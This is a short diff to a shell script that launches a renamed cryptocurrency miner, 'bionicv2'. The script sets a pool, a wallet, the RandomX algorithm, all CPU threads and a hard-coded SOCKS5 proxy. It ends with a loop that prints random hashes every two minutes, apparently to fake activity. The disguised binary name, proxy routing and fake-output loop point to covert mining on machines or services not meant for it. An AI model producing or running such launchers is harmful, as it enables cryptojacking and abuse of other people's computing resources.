@@ -10,5 +10,5 @@ wallet="novalanto"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://174.138.17.79:4145"
-./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p x -$workername --tls -t$thread
+./bionicv2 -a rx/0 -o $pool -u $wallet --keepalive --donate-level 1 -p $workername --tls -t$thread
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
